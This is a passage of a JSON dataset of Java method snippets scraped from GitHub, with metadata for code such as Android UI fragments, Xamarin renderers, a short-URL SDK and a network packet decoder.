"ScrollViewRenderer", "extends": "android", "implements": ["mono"], "modifiers": ["public"]}}, {"method_name": "onDetachedFromWindow", "params": [], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "\tpublic void onDetachedFromWindow ()\t{\t\tn_onDetachedFromWindow ();\t}", "url": "https://raw.githubusercontent.com/AtomizedSoul/TulpApp/master/TulpApp.Android/obj/Release/90/android/src/crc643f46942d9dd1fff9/ScrollViewRenderer.java", "stars": "2", "class": {"name": "ScrollViewRenderer", "extends": "android", "implements": ["mono"], "modifiers": ["public"]}}, {"method_name": "n_onDetachedFromWindow", "params": [], "throws": null, "modifiers": ["native", "private"], "return_type": "void", "snippet": "\tprivate native void n_onDetachedFromWindow ();\tpublic void onLayout (boolean p0, int p1, int p2, int p3, int p4)\t{\t\tn_onLayout (p0, p1, p2, p3, p4);\t}", "url": "https://raw.githubusercontent.com/AtomizedSoul/TulpApp/master/TulpApp.Android/obj/Release/90/android/src/crc643f46942d9dd1fff9/ScrollViewRenderer.java", "stars": "2", "class": {"name": "ScrollViewRenderer", "extends": "android", "implements": ["mono"], "modifiers": ["public"]}}, {"method_name": "onLayout", "params": ["boolean", "int", "int", "int", "int"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "\tpublic void onLayout (boolean p0, int p1, int p2, int p3, int p4)\t{\t\tn_onLayout (p0, p1, p2, p3, p4);\t}", "url": "https://raw.githubusercontent.com/AtomizedSoul/TulpApp/master/TulpApp.Android/obj/Release/90/android/src/crc643f46942d9dd1fff9/ScrollViewRenderer.java", "stars": "2", "class": {"name": "ScrollViewRenderer", "extends": "android", "implements": ["mono"], "modifiers": ["public"]}}, {"method_name": "n_onLayout", "params": ["boolean", "int", "int", "int", "int"], "throws": null, "modifiers": ["native", "private"], "return_type": "void", "snippet": "\tprivate native void n_onLayout (boolean p0, int p1, int p2, int p3, int p4);\tpublic void onScrollChanged (int p0, int p1, int p2, int p3)\t{\t\tn_onScrollChanged (p0, p1, p2, p3);\t}", "url": "https://raw.githubusercontent.com/AtomizedSoul/TulpApp/master/TulpApp.Android/obj/Release/90/android/src/crc643f46942d9dd1fff9/ScrollViewRenderer.java", "stars": "2", "class": {"name": "ScrollViewRenderer", "extends": "android", "implements": ["mono"], "modifiers": ["public"]}}, {"method_name": "onScrollChanged", "params": ["int", "int", "int", "int"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "\tpublic void onScrollChanged (int p0, int p1, int p2, int p3)\t{\t\tn_onScrollChanged (p0, p1, p2, p3);\t}", "url": "https://raw.githubusercontent.com/AtomizedSoul/TulpApp/master/TulpApp.Android/obj/Release/90/android/src/crc643f46942d9dd1fff9/ScrollViewRenderer.java", "stars": "2", "class": {"name": "ScrollViewRenderer", "extends": "android", "implements": ["mono"], "modifiers": ["public"]}}, {"method_name": "n_onScrollChanged", "params": ["int", "int", "int", "int"], "throws": null, "modifiers": ["native", "private"], "return_type": "void", "snippet": "\tprivate native void n_onScrollChanged (int p0, int p1, int p2, int p3);\tprivate java.util.ArrayList refList;\tpublic void monodroidAddReference (java.lang.Object obj)\t{\t\tif (refList == null)\t\t\trefList = new java.util.ArrayList ();\t\trefList.add (obj);\t}", "url": "https://raw.githubusercontent.com/AtomizedSoul/TulpApp/master/TulpApp.Android/obj/Release/90/android/src/crc643f46942d9dd1fff9/ScrollViewRenderer.java", "stars": "2", "class": {"name": "ScrollViewRenderer", "extends": "android", "implements": ["mono"], "modifiers": ["public"]}}, {"method_name": "monodroidAddReference", "params": ["java"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "\tpublic void monodroidAddReference (java.lang.Object obj)\t{\t\tif (refList == null)\t\t\trefList = new java.util.ArrayList ();\t\trefList.add (obj);\t}", "url": "https://raw.githubusercontent.com/AtomizedSoul/TulpApp/master/TulpApp.Android/obj/Release/90/android/src/crc643f46942d9dd1fff9/ScrollViewRenderer.java", "stars": "2", "class": {"name": "ScrollViewRenderer", "extends": "android", "implements": ["mono"], "modifiers": ["public"]}}, {"method_name": "monodroidClearReferences", "params": [], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "\tpublic void monodroidClearReferences ()\t{\t\tif (refList != null)\t\t\trefList.clear ();\t}", "url": "https://raw.githubusercontent.com/AtomizedSoul/TulpApp/master/TulpApp.Android/obj/Release/90/android/src/crc643f46942d9dd1fff9/ScrollViewRenderer.java", "stars": "2", "class": {"name": "ScrollViewRenderer", "extends": "android", "implements": ["mono"], "modifiers": ["public"]}}, {"method_name": "getInnerException", "params": [], "throws": null, "modifiers": ["public"], "return_type": "Exception", "snippet": "\tpublic Exception getInnerException() {\t\treturn innerException;\t}", "url": "https://raw.githubusercontent.com/harshalbenake/hbworkspace1-100/master/socialauth-android/src/org/brickred/socialauth/android/SocialAuthError.java", "stars": "74", "class": {"name": "SocialAuthError", "extends": "Throwable", "implements": null, "modifiers": ["public"]}}, {"method_name": "runFlushThread", "params": [], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void runFlushThread() {}", "url": "https://raw.githubusercontent.com/CNYuYang/BusTub/master/src/main/java/run/yuyang/db/recovery/LogManger.java", "stars": "2", "class": {"name": "LogManger", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "stopFlushThread", "params": [], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void stopFlushThread() {}", "url": "https://raw.githubusercontent.com/CNYuYang/BusTub/master/src/main/java/run/yuyang/db/recovery/LogManger.java", "stars": "2", "class": {"name": "LogManger", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "listEntryDomainUrl", "params": ["UrlParam"], "throws": ["DefaultException", "JsonProcessingException"], "modifiers": ["public"], "return_type": "Response<UrlArrayVO>", "snippet": "  public Response<UrlArrayVO<EntryDomainUrlVO>> listEntryDomainUrl(UrlParam urlParam) throws DefaultException, JsonProcessingException {    CommonUtil.isNotNull(urlParam);    Map<String, String> paraMap = new HashMap<>();    paraMap.put(\"appid\", urlParam.getAppid());    paraMap.put(\"appkey\", urlParam.getAppkey());    paraMap.put(\"type\", Const.OPERATION_LIST);    if (StringUtils.isNotEmpty(urlParam.getLayerType())) {      paraMap.put(\"layer_type\", urlParam.getLayerType());    }    if (StringUtils.isNotEmpty(urlParam.getStatus())) {      paraMap.put(\"status\", urlParam.getStatus());    }    if (StringUtils.isNotEmpty(urlParam.getPage())) {      paraMap.put(\"page\", urlParam.getPage());    }    if (StringUtils.isNotEmpty(urlParam.getRows())) {      paraMap.put(\"rows\", urlParam.getRows());    }    String result = httpClient.doPost(ENTRY_DOMAIN_REQUEST_URL, paraMap);    return objectMapper.readValue(result, new TypeReference<Response<UrlArrayVO<EntryDomainUrlVO>>>() {    });  }", "url": "https://raw.githubusercontent.com/wechaturl/wechat_url_api_java_sdk/master/src/main/java/www/wechaturl/us/fangfeng/sdk/service/ShortUrlService.java", "stars": "2", "class": {"name": "ShortUrlService", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "transferLongToShortUrl", "params": ["UrlParam"], "throws": ["JsonProcessingException", "DefaultException"], "modifiers": ["public"], "return_type": "Response<ShortUrlVO>", "snippet": "  public Response<ShortUrlVO> transferLongToShortUrl(UrlParam urlParam) throws JsonProcessingException, DefaultException {    CommonUtil.isNotNull(urlParam);    Map<String, String> paraMap = new HashMap<>();    paraMap.put(\"appid\", urlParam.getAppid());    paraMap.put(\"appkey\", urlParam.getAppkey());    paraMap.put(\"url\", urlParam.getUrl());    if(StringUtils.isNotEmpty(urlParam.getEntryType())){      paraMap.put(\"entry_type\", urlParam.getEntryType());    }    String result = httpClient.doPost(LONG_TO_SHORT_URL, paraMap);    return objectMapper.readValue(result, new TypeReference<Response<ShortUrlVO>>() {    });  }", "url": "https://raw.githubusercontent.com/wechaturl/wechat_url_api_java_sdk/master/src/main/java/www/wechaturl/us/fangfeng/sdk/service/ShortUrlService.java", "stars": "2", "class": {"name": "ShortUrlService", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "onLoad", "params": [], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void onLoad() {    }", "url": "https://raw.githubusercontent.com/billsonnn/nitro-java/master/core/src/main/java/com/nitro/core/plugin/NitroPlugin.java", "stars": "2", "class": {"name": "NitroPlugin", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "onEnable", "params": [], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void onEnable() {    }", "url": "https://raw.githubusercontent.com/billsonnn/nitro-java/master/core/src/main/java/com/nitro/core/plugin/NitroPlugin.java", "stars": "2", "class": {"name": "NitroPlugin", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "onDisable", "params": [], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void onDisable() {    }", "url": "https://raw.githubusercontent.com/billsonnn/nitro-java/master/core/src/main/java/com/nitro/core/plugin/NitroPlugin.java", "stars": "2", "class": {"name": "NitroPlugin", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "getCmdType", "params": [], "throws": null, "modifiers": ["protected"], "return_type": "CommandType", "snippet": "    protected CommandType getCmdType() {        return CommandType.SEARCH;    }", "url": "https://raw.githubusercontent.com/LJacksonPan/Y1-OOP-CW3/master/tests/SearchCmdTest.java", "stars": "6", "class": {"name": "SearchCmdTest", "extends": "CommandTest", "implements": null, "modifiers": ["public", "abstract"]}}, {"method_name": "setup", "params": [], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void setup() {        testCommand = new SearchCmd(SINGLE_WORD_TITLE);        testLibrary = new LibraryData();        List<BookEntry> bookData = new ArrayList<>();        bookData.add(new BookEntry(MULTI_WORD_TITLE_A, new String[]{\"AuthorA\"}, 3.2f, \"ISBNA\", 500));        bookData.add(new BookEntry(SINGLE_WORD_TITLE, new String[]{\"AuthorB\"}, 4.3f, \"ISBNB\", 400));        bookData.add(new BookEntry(MULTI_WORD_TITLE_B, new String[]{\"AuthorC\"}, 1.3f, \"ISBNC\", 300));        FieldTestUtils.setPrivateField(testLibrary, testLibrary.getClass(), \"books\", bookData);    }", "url": "https://raw.githubusercontent.com/LJacksonPan/Y1-OOP-CW3/master/tests/SearchCmdTest.java", "stars": "6", "class": {"name": "SearchCmdTest", "extends": "CommandTest", "implements": null, "modifiers": ["public", "abstract"]}}, {"method_name": "newInstance", "params": ["Mode", "MediaProvider", "MediaProvider"], "throws": null, "modifiers": ["public", "static"], "return_type": "MediaListFragment", "snippet": "    public static MediaListFragment newInstance(Mode mode, MediaProvider.Filters.Sort filter, MediaProvider.Filters.Order defOrder) {        return newInstance(mode, filter, defOrder, null);    }", "url": "https://raw.githubusercontent.com/abdalmoniem/Movie-App/master/mobile/src/main/java/butter/droid/fragments/MediaListFragment.java", "stars": "4", "class": {"name": "MediaListFragment", "extends": "Fragment", "implements": ["LoadingDetailDialogFragment"], "modifiers": ["public"]}}, {"method_name": "newInstance", "params": ["Mode", "MediaProvider", "MediaProvider", "String"], "throws": null, "modifiers": ["public", "static"], "return_type": "MediaListFragment", "snippet": "    public static MediaListFragment newInstance(Mode mode, MediaProvider.Filters.Sort sort, MediaProvider.Filters.Order order, String genre) {        MediaListFragment frag = new MediaListFragment();        Bundle args = new Bundle();        args.putSerializable(EXTRA_MODE, mode);        args.putSerializable(EXTRA_SORT, sort);        args.putSerializable(EXTRA_ORDER, order);        args.putString(EXTRA_GENRE, genre);        frag.setArguments(args);        return frag;    }", "url": "https://raw.githubusercontent.com/abdalmoniem/Movie-App/master/mobile/src/main/java/butter/droid/fragments/MediaListFragment.java", "stars": "4", "class": {"name": "MediaListFragment", "extends": "Fragment", "implements": ["LoadingDetailDialogFragment"], "modifiers": ["public"]}}, {"method_name": "onCreate", "params": ["Bundle"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void onCreate(Bundle savedInstanceState) {        super.onCreate(savedInstanceState);        MobileButterApplication.getAppContext()                .getComponent()                .inject(this);        if (getArguments() != null) {            String language = PrefUtils.get(getActivity(), Prefs.LOCALE, ButterApplication.getSystemLanguage());            mFilters.setSort((MediaProvider.Filters.Sort) getArguments().getSerializable(EXTRA_SORT));            mFilters.setOrder((MediaProvider.Filters.Order) getArguments().getSerializable(EXTRA_ORDER));            mFilters.setGenre(getArguments().getString(EXTRA_GENRE));            mFilters.setLangCode(LocaleUtils.toLocale(language).getLanguage());            mMode = (Mode) getArguments().getSerializable(EXTRA_MODE);        }    }", "url": "https://raw.githubusercontent.com/abdalmoniem/Movie-App/master/mobile/src/main/java/butter/droid/fragments/MediaListFragment.java", "stars": "4", "class": {"name": "MediaListFragment", "extends": "Fragment", "implements": ["LoadingDetailDialogFragment"], "modifiers": ["public"]}}, {"method_name": "onCreateView", "params": ["LayoutInflater", "ViewGroup", "Bundle"], "throws": null, "modifiers": ["public"], "return_type": "View", "snippet": "    public View onCreateView(LayoutInflater inflater, @Nullable ViewGroup container, @Nullable Bundle savedInstanceState) {        mContext = getActivity();        mRootView = inflater.inflate(R.layout.fragment_media, container, false);        ButterKnife.bind(this, mRootView);        mColumns = Integer.parseInt(PrefUtils.get(getContext(), Prefs.GRID_SIZE, \"2\"));        mLoadingTreshold = mColumns * 3;        mLayoutManager = new GridLayoutManager(mContext, mColumns);        mRecyclerView.setLayoutManager(mLayoutManager);        mSwipeRefreshLayout.setOnRefreshListener(() -> {            mAdapter.resetItemAnimationLastPosition();            mFilters.setGenre(mFilters.getGenre());            mFilters.setPage(1);            setState(State.REFRESHING);            providerManager.getCurrentMediaProvider()                    .getList(new MediaProvider.Filters(mFilters), mMediaListCallback);            mSwipeRefreshLayout.setRefreshing(false);        });        return mRootView;    }", "url": "https://raw.githubusercontent.com/abdalmoniem/Movie-App/master/mobile/src/main/java/butter/droid/fragments/MediaListFragment.java", "stars": "4", "class": {"name": "MediaListFragment", "extends": "Fragment", "implements": ["LoadingDetailDialogFragment"], "modifiers": ["public"]}}, {"method_name": "onViewCreated", "params": ["View", "Bundle"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void onViewCreated(View view, @Nullable Bundle savedInstanceState) {        super.onViewCreated(view, savedInstanceState);        mRecyclerView.setHasFixedSize(true);        mRecyclerView.addOnScrollListener(mScrollListener);        //adapter should only ever be created once on fragment initialise.        mAdapter = new MediaGridAdapter(mContext, mItems, mColumns);        mAdapter.setOnItemClickListener(mOnItemClickListener);        mAdapter.resetItemAnimationLastPosition();        mRecyclerView.setAdapter(mAdapter);        mRecyclerViewState = mRecyclerView.getLayoutManager().onSaveInstanceState();        if (mMode == Mode.SEARCH) {            mEmptyView.setText(getString(R.string.no_search_results));        } else if (mAdapter.getItemCount() == 0) { //don't load initial data in search mode            setState(State.LOADING);            providerManager.getCurrentMediaProvider().getList(new MediaProvider.Filters(mFilters), mMediaListCallback);/* fetch new items */        } else {            updateUI();        }    }", "url": "https://raw.githubusercontent.com/abdalmoniem/Movie-App/master/mobile/src/main/java/butter/droid/fragments/MediaListFragment.java", "stars": "4", "class": {"name": "MediaListFragment", "extends": "Fragment", "implements": ["LoadingDetailDialogFragment"], "modifiers": ["public"]}}, {"method_name": "onPause", "params": [], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void onPause() {        super.onPause();        mRecyclerViewState = mRecyclerView.getLayoutManager().onSaveInstanceState();    }", "url": "https://raw.githubusercontent.com/abdalmoniem/Movie-App/master/mobile/src/main/java/butter/droid/fragments/MediaListFragment.java", "stars": "4", "class": {"name": "MediaListFragment", "extends": "Fragment", "implements": ["LoadingDetailDialogFragment"], "modifiers": ["public"]}}, {"method_name": "onResume", "params": [], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void onResume() {        super.onResume();        mColumns = Integer.parseInt(PrefUtils.get(getContext(), Prefs.GRID_SIZE, \"2\"));        mLoadingTreshold = mColumns * 3;        mLayoutManager = new GridLayoutManager(mContext, mColumns);        mRecyclerView.setLayoutManager(mLayoutManager);        mRecyclerView.setHasFixedSize(true);        //adapter should only ever be created once on fragment initialise.        mAdapter = new MediaGridAdapter(mContext, mItems, mColumns);        mAdapter.setOnItemClickListener(mOnItemClickListener);        mAdapter.resetItemAnimationLastPosition();        mRecyclerView.setAdapter(mAdapter);        mRecyclerView.getLayoutManager().onRestoreInstanceState(mRecyclerViewState);    }", "url": "https://raw.githubusercontent.com/abdalmoniem/Movie-App/master/mobile/src/main/java/butter/droid/fragments/MediaListFragment.java", "stars": "4", "class": {"name": "MediaListFragment", "extends": "Fragment", "implements": ["LoadingDetailDialogFragment"], "modifiers": ["public"]}}, {"method_name": "onViewStateRestored", "params": ["Bundle"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void onViewStateRestored(@Nullable Bundle savedInstanceState) {        super.onViewStateRestored(savedInstanceState);        mAdapter.setOnItemClickListener(mOnItemClickListener);    }", "url": "https://raw.githubusercontent.com/abdalmoniem/Movie-App/master/mobile/src/main/java/butter/droid/fragments/MediaListFragment.java", "stars": "4", "class": {"name": "MediaListFragment", "extends": "Fragment", "implements": ["LoadingDetailDialogFragment"], "modifiers": ["public"]}}, {"method_name": "changeGenre", "params": ["String"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void changeGenre(String genre) {        if (!(mFilters.getGenre() == null ? \"\" : mFilters.getGenre()).equals(genre == null ? \"\" : genre)) {            mAdapter.resetItemAnimationLastPosition();            mFilters.setGenre(genre);            mFilters.setPage(1);            setState(State.REFRESHING);            providerManager.getCurrentMediaProvider()                    .getList(new MediaProvider.Filters(mFilters), mMediaListCallback);        }    }", "url": "https://raw.githubusercontent.com/abdalmoniem/Movie-App/master/mobile/src/main/java/butter/droid/fragments/MediaListFragment.java", "stars": "4", "class": {"name": "MediaListFragment", "extends": "Fragment", "implements": ["LoadingDetailDialogFragment"], "modifiers": ["public"]}}, {"method_name": "updateLoadingMessage", "params": [], "throws": null, "modifiers": ["private"], "return_type": "void", "snippet": "    private void updateLoadingMessage() {        mProgressTextView.setText(mLoadingMessage);    }", "url": "https://raw.githubusercontent.com/abdalmoniem/Movie-App/master/mobile/src/main/java/butter/droid/fragments/MediaListFragment.java", "stars": "4", "class": {"name": "MediaListFragment", "extends": "Fragment", "implements": ["LoadingDetailDialogFragment"], "modifiers": ["public"]}}, {"method_name": "setState", "params": ["State"], "throws": null, "modifiers": ["private"], "return_type": "void", "snippet": "    private void setState(State state) {        if (mState != state) {            mState = state;            updateUI();        }    }", "url": "https://raw.githubusercontent.com/abdalmoniem/Movie-App/master/mobile/src/main/java/butter/droid/fragments/MediaListFragment.java", "stars": "4", "class": {"name": "MediaListFragment", "extends": "Fragment", "implements": ["LoadingDetailDialogFragment"], "modifiers": ["public"]}}, {"method_name": "updateUI", "params": [], "throws": null, "modifiers": ["private"], "return_type": "void", "snippet": "    private void updateUI() {        if (!isAdded()) return;        ThreadUtils.runOnUiThread(() -> {            switch (mState) {                case LOADING_DETAIL:                    mLoadingMessage = R.string.loading_details;                    break;                case SEARCHING:                    mLoadingMessage = R.string.searching;                    break;                case REFRESHING:                case LOADING:                    if (mAdapter.isLoading()) mAdapter.removeLoading();                    //show the progress bar                    mRecyclerView.setVisibility(View.VISIBLE);                    mRecyclerView.animate().alpha(0.5f).setDuration(500).start();                    mEmptyView.setVisibility(View.GONE);                    mProgressOverlay.setVisibility(View.VISIBLE);                    break;                case LOADED:                    if (mAdapter.isLoading()) mAdapter.removeLoading();                    mProgressOverlay.setVisibility(View.GONE);                    boolean hasItems = mItems.size() > 0;                    //show either the recyclerview or the empty view                    mRecyclerView.animate().alpha(1.0f).setDuration(100).start();                    mRecyclerView.setVisibility(hasItems ? View.VISIBLE : View.INVISIBLE);                    mEmptyView.setVisibility(hasItems ? View.GONE : View.VISIBLE);                    break;                case LOADING_PAGE:                    //add a loading view to the adapter                    if (!mAdapter.isLoading()) mAdapter.addLoading();                    mEmptyView.setVisibility(View.GONE);                    mRecyclerView.setVisibility(View.VISIBLE);                    break;                default:                    int providerMessage = providerManager.getCurrentMediaProvider().getLoadingMessage();                    mLoadingMessage = providerMessage > 0 ? providerMessage : R.string.loading_data;                    break;            }            updateLoadingMessage();        });    }", "url": "https://raw.githubusercontent.com/abdalmoniem/Movie-App/master/mobile/src/main/java/butter/droid/fragments/MediaListFragment.java", "stars": "4", "class": {"name": "MediaListFragment", "extends": "Fragment", "implements": ["LoadingDetailDialogFragment"], "modifiers": ["public"]}}, {"method_name": "showLoadingDialog", "params": ["Integer"], "throws": null, "modifiers": ["private"], "return_type": "void", "snippet": "    private void showLoadingDialog(Integer position) {        LoadingDetailDialogFragment loadingFragment = LoadingDetailDialogFragment.newInstance(position);        loadingFragment.setTargetFragment(MediaListFragment.this, LOADING_DIALOG_FRAGMENT);        loadingFragment.show(getFragmentManager(), DIALOG_LOADING_DETAIL);    }", "url": "https://raw.githubusercontent.com/abdalmoniem/Movie-App/master/mobile/src/main/java/butter/droid/fragments/MediaListFragment.java", "stars": "4", "class": {"name": "MediaListFragment", "extends": "Fragment", "implements": ["LoadingDetailDialogFragment"], "modifiers": ["public"]}}, {"method_name": "triggerSearch", "params": ["String"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void triggerSearch(String searchQuery) {        if (!isAdded()) return;        if (null == mAdapter) return;        if (!NetworkUtils.isNetworkConnected(getActivity())) {            Toast.makeText(getActivity(), R.string.network_message, Toast.LENGTH_SHORT).show();            return;        }        providerManager.getCurrentMediaProvider().cancel();        mEndOfListReached = false;        mItems.clear();        mAdapter.clearItems();//clear out adapter        if (searchQuery.equalsIgnoreCase(\"\")) {            setState(State.LOADED);            return; //don't do a search for empty queries        }        setState(State.SEARCHING);        mPage = 1;        mFilters.setPage(mPage);        mFilters.setKeywords(searchQuery);        providerManager.getCurrentMediaProvider().getList(new MediaProvider.Filters(mFilters), mMediaListCallback);    }", "url": "https://raw.githubusercontent.com/abdalmoniem/Movie-App/master/mobile/src/main/java/butter/droid/fragments/MediaListFragment.java", "stars": "4", "class": {"name": "MediaListFragment", "extends": "Fragment", "implements": ["LoadingDetailDialogFragment"], "modifiers": ["public"]}}, {"method_name": "onDetailLoadFailure", "params": [], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void onDetailLoadFailure() {        Snackbar.make(mRootView, R.string.unknown_error, Snackbar.LENGTH_SHORT).show();    }", "url": "https://raw.githubusercontent.com/abdalmoniem/Movie-App/master/mobile/src/main/java/butter/droid/fragments/MediaListFragment.java", "stars": "4", "class": {"name": "MediaListFragment", "extends": "Fragment", "implements": ["LoadingDetailDialogFragment"], "modifiers": ["public"]}}, {"method_name": "onDetailLoadSuccess", "params": ["Media"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void onDetailLoadSuccess(final Media item) {        MediaDetailActivity.startActivity(mContext, item);    }", "url": "https://raw.githubusercontent.com/abdalmoniem/Movie-App/master/mobile/src/main/java/butter/droid/fragments/MediaListFragment.java", "stars": "4", "class": {"name": "MediaListFragment", "extends": "Fragment", "implements": ["LoadingDetailDialogFragment"], "modifiers": ["public"]}}, {"method_name": "getCurrentList", "params": [], "throws": null, "modifiers": ["public"], "return_type": "ArrayList<Media>", "snippet": "    public ArrayList<Media> getCurrentList() {        return mItems;    }", "url": "https://raw.githubusercontent.com/abdalmoniem/Movie-App/master/mobile/src/main/java/butter/droid/fragments/MediaListFragment.java", "stars": "4", "class": {"name": "MediaListFragment", "extends": "Fragment", "implements": ["LoadingDetailDialogFragment"], "modifiers": ["public"]}}, {"method_name": "getUniqueCodeUrl", "params": [], "throws": null, "modifiers": ["public"], "return_type": "String", "snippet": "\tpublic String getUniqueCodeUrl() {\t\treturn uniqueCodeUrl;\t}", "url": "https://raw.githubusercontent.com/akifarfien/RestApi-SpringBoot--ChatMateApp/master/src/main/java/com/project/copypasteapi/Bean/CopyPasteBean.java", "stars": "2", "class": {"name": "CopyPasteBean", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "setUniqueCodeUrl", "params": ["String"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "\tpublic void setUniqueCodeUrl(String uniqueCodeUrl) {\t\tthis.uniqueCodeUrl = uniqueCodeUrl;\t}", "url": "https://raw.githubusercontent.com/akifarfien/RestApi-SpringBoot--ChatMateApp/master/src/main/java/com/project/copypasteapi/Bean/CopyPasteBean.java", "stars": "2", "class": {"name": "CopyPasteBean", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "getLastcontent", "params": [], "throws": null, "modifiers": ["public"], "return_type": "String", "snippet": "\tpublic String getLastcontent() {\t\treturn lastcontent;\t}", "url": "https://raw.githubusercontent.com/akifarfien/RestApi-SpringBoot--ChatMateApp/master/src/main/java/com/project/copypasteapi/Bean/CopyPasteBean.java", "stars": "2", "class": {"name": "CopyPasteBean", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "setLastcontent", "params": ["String"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "\tpublic void setLastcontent(String lastcontent) {\t\tthis.lastcontent = lastcontent;\t}", "url": "https://raw.githubusercontent.com/akifarfien/RestApi-SpringBoot--ChatMateApp/master/src/main/java/com/project/copypasteapi/Bean/CopyPasteBean.java", "stars": "2", "class": {"name": "CopyPasteBean", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "getDateandTime", "params": [], "throws": null, "modifiers": ["public"], "return_type": "String", "snippet": "\tpublic String getDateandTime() {\t\treturn dateandTime;\t}", "url": "https://raw.githubusercontent.com/akifarfien/RestApi-SpringBoot--ChatMateApp/master/src/main/java/com/project/copypasteapi/Bean/CopyPasteBean.java", "stars": "2", "class": {"name": "CopyPasteBean", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "setDateandTime", "params": ["String"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "\tpublic void setDateandTime(String dateandTime) {\t\tthis.dateandTime = dateandTime;\t}", "url": "https://raw.githubusercontent.com/akifarfien/RestApi-SpringBoot--ChatMateApp/master/src/main/java/com/project/copypasteapi/Bean/CopyPasteBean.java", "stars": "2", "class": {"name": "CopyPasteBean", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "getName", "params": [], "throws": null, "modifiers": ["public"], "return_type": "String", "snippet": "\tpublic String getName() {\t\treturn name;\t}", "url": "https://raw.githubusercontent.com/akifarfien/RestApi-SpringBoot--ChatMateApp/master/src/main/java/com/project/copypasteapi/Bean/CopyPasteBean.java", "stars": "2", "class": {"name": "CopyPasteBean", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "setName", "params": ["String"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "\tpublic void setName(String name) {\t\tthis.name = name;\t}", "url": "https://raw.githubusercontent.com/akifarfien/RestApi-SpringBoot--ChatMateApp/master/src/main/java/com/project/copypasteapi/Bean/CopyPasteBean.java", "stars": "2", "class": {"name": "CopyPasteBean", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "getContentList", "params": [], "throws": null, "modifiers": ["public"], "return_type": "List<UserData>", "snippet": "\tpublic List<UserData> getContentList() {\t\treturn contentList;\t}", "url": "https://raw.githubusercontent.com/akifarfien/RestApi-SpringBoot--ChatMateApp/master/src/main/java/com/project/copypasteapi/Bean/CopyPasteBean.java", "stars": "2", "class": {"name": "CopyPasteBean", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "setContentList", "params": ["List<UserData>"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "\tpublic void setContentList(List<UserData> contentList) {\t\tthis.contentList = contentList;\t}", "url": "https://raw.githubusercontent.com/akifarfien/RestApi-SpringBoot--ChatMateApp/master/src/main/java/com/project/copypasteapi/Bean/CopyPasteBean.java", "stars": "2", "class": {"name": "CopyPasteBean", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "decode", "params": ["ChannelHandlerContext", "ByteBuf", "List<Object>"], "throws": ["DataFormatException", "Exception"], "modifiers": ["protected"], "return_type": "void", "snippet": "    protected void decode(ChannelHandlerContext p_decode_1_, ByteBuf p_decode_2_, List<Object> p_decode_3_) throws DataFormatException, Exception    {        if (p_decode_2_.readableBytes() != 0)        {            PacketBuffer packetbuffer = new PacketBuffer(p_decode_2_);            int i = packetbuffer.readVarInt();            if (i == 0)            {                p_decode_3_.add(packetbuffer.readBytes(packetbuffer.readableBytes()));            }            else            {                if (i < this.threshold)                {                    ChatUtil.print(\"Badly compressed packet - size of \" + i + \" is below server threshold of \" + this.threshold);                }                if (i > 2097152)                {                    ChatUtil.print(\"Badly compressed packet - size of \" + i + \" is larger than protocol maximum of \" + 2097152);                }                byte[] abyte = new byte[packetbuffer.readableBytes()];                packetbuffer.readBytes(abyte);                this.inflater.setInput(abyte);                byte[] abyte1 = new byte[i];                this.inflater.inflate(abyte1);                p_decode_3_.add(Unpooled.wrappedBuffer(abyte1));                this.inflater.reset();            }        }    }", "url": "https://raw.githubusercontent.com/Crystallinqq/Mercury-Client/master/src/main/java/fail/mercury/client/api/mixin/MixinNettyCompressionDecoder.java", "stars": "12", "class": {"name": "MixinNettyCompressionDecoder", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "onLayout", "params": ["boolean", "int", "int", "int", "int"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "\tpublic void onLayout (boolean p0, int p1, int p2, int p3, int p4)\t{\t\tn_onLayout (p0, p1, p2, p3, p4);\t}", "url": "https://raw.githubusercontent.com/AtomizedSoul/TulpApp/master/TulpApp.Android/obj/Release/90/android/src/crc643f46942d9dd1fff9/ContainerView.java", "stars": "2", "class": {"name": "ContainerView", "extends": "android", "implements": ["mono"], "modifiers": ["public"]}}, {"method_name": "n_onLayout", "params": ["boolean", "int", "int", "int", "int"], "throws": null, 